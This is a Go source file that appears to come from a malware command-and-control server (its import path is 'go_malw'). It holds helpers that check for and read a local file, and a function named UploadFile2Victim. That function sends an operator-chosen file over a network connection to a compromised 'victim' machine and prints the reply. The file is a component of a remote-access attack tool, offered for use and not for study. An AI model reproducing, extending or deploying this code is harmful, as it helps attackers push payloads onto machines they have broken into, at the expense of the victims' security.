package Upload

import (
	"bufio"
	"encoding/gob"
	"errors"
	"fmt"
	"go_malw/server/core/color"
	"net"
	"os"
	"strings"
)

type FileStruct struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func CheckExistence(fileName string) bool {
	if _, err := os.Stat(fileName); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func ReadFileContents(fileName string) ([]byte, error) {
	file, err := os.Open(fileName)
	if err != nil {
		fmt.Println(color.Red + "[-]" + color.Reset + " Unable to open file")
		return nil, err
	}

	defer file.Close()

	stats, err := file.Stat()
	FileSize := stats.Size()
	fmt.Println(color.Green+"[+]"+color.Reset+" The file contains ", FileSize, " bytes")

	bytes := make([]byte, FileSize)

	buffer := bufio.NewReader(file)

	_, err = buffer.Read(bytes)

	return bytes, err
}

func UploadFile2Victim(connection net.Conn) (err error) {

	reader := bufio.NewReader(os.Stdin)

	fmt.Printf(color.Blue + "[*] " + color.Reset + "Insert the name of the file: ")
	user_input_fileName_raw, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println(color.Red + "[-]" + color.Reset + err.Error())
	}

	user_input_fileName := strings.TrimSuffix(user_input_fileName_raw, "\n")

	fileName := user_input_fileName
	//fileName := "file.jpeg"

	fileExists := CheckExistence(fileName)
	//fmt.Println(fileExists)

	if fileExists == false {
		err = errors.New(color.Red + "[-]" + color.Reset + " File does not exist")
		return err
	}

	content, err := ReadFileContents(fileName)

	fileSize := len(content)

	fs := &FileStruct{
		FileName:    fileName,
		FileSize:    fileSize,
		FileContent: content,
	}

	encoder := gob.NewEncoder(connection)

	err = encoder.Encode(fs)

	if err != nil {
		fmt.Println(color.Red + "[-]" + color.Reset + " Error Encoding")
		return
	}

	reader2 := bufio.NewReader(connection)
	status, err := reader2.ReadString('\n')

	fmt.Println(status)

	return
}
